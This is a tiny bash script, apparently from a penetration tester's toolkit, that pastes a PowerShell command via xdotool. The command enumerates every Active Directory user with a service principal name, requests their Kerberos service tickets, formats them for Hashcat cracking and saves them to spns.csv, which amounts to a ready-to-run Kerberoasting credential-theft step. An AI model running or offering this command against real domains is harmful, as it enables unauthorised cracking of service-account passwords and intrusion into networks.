#!/bin/bash

"""
PowerShell: Get SPNs, format for Hashcat, export to spns.csv.
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spns.csv -NoTypeInformation"